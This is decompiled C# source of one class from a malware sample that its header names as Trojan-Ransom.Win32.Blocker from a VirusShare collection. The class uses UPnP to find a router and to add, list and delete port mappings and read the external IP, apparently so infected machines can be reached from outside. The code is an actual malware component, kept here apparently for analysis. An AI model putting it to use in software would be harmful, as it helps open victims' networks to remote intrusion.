// Decompiled with JetBrains decompiler
// Type: insomnia.Class29
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;

namespace insomnia
{
  internal class Class29
  {
    private static IPAddress Field2 = Class18.Method3(true);
    private static Interface22 Field1 = (Interface22) null;

    private static Interface22 Method9(Interface19 A_0)
    {
      IEnumerator enumerator = A_0.Property37.Method1();
      try
      {
        while (enumerator.MoveNext())
        {
          Interface22 current = (Interface22) enumerator.Current;
          if (Class29.Method7(current))
            return current;
          if (A_0.Property51)
            return Class29.Method8(A_0.Property50);
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          disposable.Dispose();
      }
      return (Interface22) null;
    }

    private static Interface22 Method8(Interface21 A_0)
    {
      IEnumerator enumerator = A_0.Method1();
      try
      {
        while (enumerator.MoveNext())
        {
          Interface22 nterface22 = Class29.Method9((Interface19) enumerator.Current);
          if (nterface22 != null)
            return nterface22;
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          disposable.Dispose();
      }
      return (Interface22) null;
    }

    private static bool Method7(Interface22 A_0) => A_0.Property34 == "urn:schemas-upnp-org:service:WANIPConnection:1";

    public static bool Method6(int A_0, string A_1)
    {
      if (Class29.Field1 == null)
        return false;
      object[] A_2 = new object[3]
      {
        (object) "",
        (object) A_0,
        (object) A_1
      };
      object A_3 = new object();
      try
      {
        Class29.Field1.Method2("DeletePortMapping", (object) A_2, ref A_3);
        return true;
      }
      catch
      {
        return false;
      }
    }

    public static bool Method5()
    {
      Class29.Field1 = (Interface22) null;
      Class29.Field1 = Class29.Method8(((Interface10) Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("E2085F28-FEB7-404A-B8E7-E659BDEAAA02")))).Method5("urn:schemas-upnp-org:device:InternetGatewayDevice:1", 0U));
      return Class29.Field1 != null;
    }

    public static string Method4()
    {
      if (Class29.Field1 == null)
        return "";
      object A_2 = new object();
      object A_3 = new object();
      Class29.Field1.Method2("GetExternalIPAddress", A_2, ref A_3);
      return (string) ((object[]) A_3)[0];
    }

    public static List<Struct4> Method3()
    {
      if (Class29.Field1 == null)
        return (List<Struct4>) null;
      List<Struct4> struct4List = new List<Struct4>();
      bool flag = false;
      int num = 0;
      while (!flag)
      {
        object[] A_2 = new object[1]{ (object) num };
        object A_3 = new object();
        try
        {
          Class29.Field1.Method2("GetGenericPortMappingEntry", (object) A_2, ref A_3);
          object[] objArray = (object[]) A_3;
          ++num;
          struct4List.Add(new Struct4()
          {
            Field4 = (ushort) objArray[1],
            Field3 = (ushort) objArray[3],
            Field2 = (string) objArray[2],
            Field1 = (string) objArray[6]
          });
        }
        catch
        {
          flag = true;
        }
      }
      return struct4List;
    }

    public static bool Method2(int A_0, string A_1)
    {
      if (Class29.Field1 == null)
        return false;
      object[] A_2 = new object[3]
      {
        (object) "",
        (object) A_0,
        (object) A_1
      };
      object A_3 = new object();
      try
      {
        Class29.Field1.Method2("GetSpecificPortMappingEntry", (object) A_2, ref A_3);
        return true;
      }
      catch
      {
        return false;
      }
    }

    public static bool Method1(int A_0, int A_1, string A_2, string A_3, int A_4 = 0)
    {
      if (Class29.Field1 == null || Class29.Method2(A_0, A_2))
        return false;
      object[] A_2_1 = new object[8]
      {
        (object) "",
        (object) A_0,
        (object) A_2,
        (object) A_1,
        (object) Class29.Field2.ToString(),
        (object) true,
        (object) A_3,
        (object) A_4
      };
      object A_3_1 = new object();
      try
      {
        Class29.Field1.Method2("AddPortMapping", (object) A_2_1, ref A_3_1);
        return true;
      }
      catch
      {
        return false;
      }
    }
  }
}
